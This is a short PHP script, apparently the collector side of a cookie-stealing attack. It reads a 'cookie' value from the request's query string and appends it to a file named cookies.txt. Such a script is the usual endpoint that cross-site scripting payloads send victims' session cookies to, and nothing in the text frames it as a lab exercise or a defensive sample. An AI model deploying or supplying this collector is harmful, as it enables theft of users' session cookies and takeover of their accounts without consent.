<?php
if (isset($_GET['cookie'])) {
    $cookie = $_GET['cookie'];
    $log = fopen("cookies.txt", "a+");
    fwrite($log, $cookie . "\n");
    fclose($log);
}